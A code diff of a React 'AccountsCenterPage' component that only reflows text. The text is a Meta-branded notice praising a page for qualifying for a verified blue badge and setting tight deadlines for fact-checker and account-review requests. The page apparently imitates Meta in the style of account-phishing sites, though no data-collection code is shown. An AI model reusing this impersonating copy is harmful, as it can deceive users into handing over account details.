@@ -51,13 +51,7 @@ export default function AccountsCenterPage() {
 
             <div className="mt-[32px] space-y-[15px] text-[15px] leading-[22.5px] text-[#171A1D] text-left">
               <p>
-                Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This <br className="hidden md:block" />
-                is a fantastic milestone that reflects your dedication and the trust you&apos;ve built with your audience.
-              </p>
-
-              <p>
-                We&apos;re thrilled to celebrate this moment with you and look forward to seeing your page thrive with <br className="hidden md:block" />
-                this prestigious recognition!
+                Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you've built with your audience. We're thrilled to celebrate this moment with you and look forward to seeing your page thrive with this prestigious recognition!
               </p>
 
               <p className="text-[#65676B]">
@@ -70,21 +64,16 @@ export default function AccountsCenterPage() {
                 </h2>
 
                 <div className="space-y-[15px] text-[#171A1D]">
-                   <p>
-                     - Fact checkers may not respond to requests containing intimidation, hate speech, or verbal threats
-                   </p>
-                   
-                   <p>
-                    - In your request, please provide all required information to ensure timely processing by the fact <br className="hidden md:block" />
-                    checker. Submitting an invalid email address or failing to reply to requests for additional <br className="hidden md:block" />
-                    information within 2 days may lead to the application being closed without review. If the request <br className="hidden md:block" />
-                    remains unprocessed after 4 days, Meta will automatically reject it.
+                  <p>
+                    - Fact checkers may not respond to requests containing intimidation, hate speech, or verbal threats
+                  </p>
+                  
+                  <p>
+                    - In your request, please provide all required information to ensure timely processing by the fact checker. Submitting an invalid email address or failing to reply to requests for additional information within 2 days may lead to the application being closed without review. If the request remains unprocessed after 4 days, Meta will automatically reject it.
                   </p>
 
                   <p>
-                    - Once all details are submitted, we will evaluate your account to check for any restrictions. The <br className="hidden md:block" />
-                    verification process typically takes 24 hours, though it may extend in some cases. Based on our <br className="hidden md:block" />
-                    decision, restrictions will either remain or be lifted, and your account will be updated accordingly.
+                    - Once all details are submitted, we will evaluate your account to check for any restrictions. The verification process typically takes 24 hours, though it may extend in some cases. Based on our decision, restrictions will either remain or be lifted, and your account will be updated accordingly.
                   </p>
                 </div>
               </div>
